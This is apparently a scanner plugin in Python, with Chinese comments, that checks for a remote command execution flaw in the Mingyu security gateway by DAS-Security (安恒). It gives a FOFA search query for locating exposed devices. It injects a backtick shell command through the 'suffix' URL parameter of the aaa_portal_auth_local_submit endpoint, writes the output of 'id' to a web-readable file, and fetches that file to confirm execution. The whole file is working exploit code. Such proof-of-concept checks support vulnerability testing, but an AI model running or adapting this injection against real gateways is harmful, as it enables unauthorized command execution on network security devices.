#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://peiqi.wgpsec.org/wiki/iot/安恒/安恒 明御安全网关 aaa_portal_auth_local_submit 远程命令执行漏洞.html',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '安恒 明御安全网关 aaa_portal_auth_local_submit 远程命令执行',

      'level'     :   'high',

      'FOFA'      :   'body="/webui/images/basic/login/" && title=="明御安全网关"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(10)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept-Encoding': 'gzip',
      }
  target = f"/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(`id >/usr/local/webui/{r0}.txt`)}}"
  url1 = url + target
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'success.*?local_logo',res.text,re.S):
      res.close()
    else:
      return ret
  except:
    return ret
  try:
    resp=requests.get(url=url+f'/{r0}.txt',headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and re.search(r'uid=.*?gid=.*?',resp.text,re.S):
      ret['huixian'] = '漏洞验证地址：\n'+url+f'/{r0}.txt'
      resp.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret